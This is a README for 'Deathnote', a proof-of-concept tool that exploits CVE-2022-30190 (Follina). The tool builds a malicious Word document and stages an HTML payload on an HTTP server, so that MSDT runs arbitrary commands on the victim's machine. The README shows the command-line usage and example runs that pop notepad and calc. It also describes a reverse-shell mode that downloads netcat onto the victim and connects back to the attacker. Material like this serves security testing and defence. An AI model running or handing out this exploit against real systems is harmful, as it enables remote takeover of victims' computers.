# Deathnote
<p align="center">
 
<img src="https://media3.giphy.com/media/xT1XH3NIegS0FBc1K8/giphy.gif">

 </p>
 
### Proof of Concept of CVE-2022-30190

 `A remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights.`

--------------

Create a "Deathnote" MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.

# Usage

```
usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]

options:
  -h, --help            show this help message and exit
  --command COMMAND, -c COMMAND
                        command to run on the target (default: Notepad)
  --output OUTPUT, -o OUTPUT
                        output maldoc file (default: ./Deathnote.doc)
  --interface INTERFACE, -i INTERFACE
                        network interface or IP address to host the HTTP server (default: eth0)
  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
```

# Examples

Pop `notepad.exe`:

```
$ python3 Deathnote.py   
[+] copied staging doc /tmp/9mcvbrwo
[+] created maldoc ./Deathnote.doc
[+] serving html payload on :8000
```

Pop `calc.exe`:

```
$ python3 Deathnote.py -c "calc"
```

![demo](https://user-images.githubusercontent.com/86009160/194345014-808a8bbe-44ed-4c74-9a28-cc9933cdd3f7.gif)


### Get a reverse shell on port 4444. **Note, this downloads a netcat binary _onto the victim_ and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.**
 
 Get `reverse shell` :
 
 ```
 python3 Deathnote.py -p 1234
 ```
